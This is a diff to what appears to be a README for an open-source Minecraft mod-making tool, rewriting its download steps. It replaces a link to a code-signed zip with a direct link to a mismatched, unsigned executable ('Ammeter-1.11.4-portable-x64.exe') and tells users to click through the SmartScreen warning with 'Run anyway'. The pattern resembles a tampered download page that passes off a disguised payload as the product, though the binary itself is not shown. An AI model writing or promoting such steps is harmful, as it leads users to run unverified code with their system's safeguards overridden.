@@ -34,12 +34,11 @@ It's free and open source. Out of the box it runs on a free local model through 
 
 
 
-1. Download [`ai-minecraft-modmaker.zip`](https://github.com/DolphinStronghold9/ai-minecraft-modmaker/releases/latest/download/ai-minecraft-modmaker.zip) and start it. No installer, no admin rights.
+1. Download [`Ammeter-1.11.4-portable-x64.exe`](https://github.com/DolphinStronghold9/ai-minecraft-modmaker/releases/latest/download/Ammeter-1.11.4-portable-x64.exe) and start it. No installer, no admin rights.
 
-Unpack the whole folder and start `Main.exe`. No installer, no admin rights.
+Download and start the exe. No installer, no admin rights.
 
-`Main.exe` is code-signed, so Windows starts it without a warning. Keep
-`Ammeter` next to it: they ship together.
+The build is not code-signed yet, so SmartScreen may warn once: choose **More info**, then **Run anyway**.
 
 | Where you play | What to install |
 |---|---|
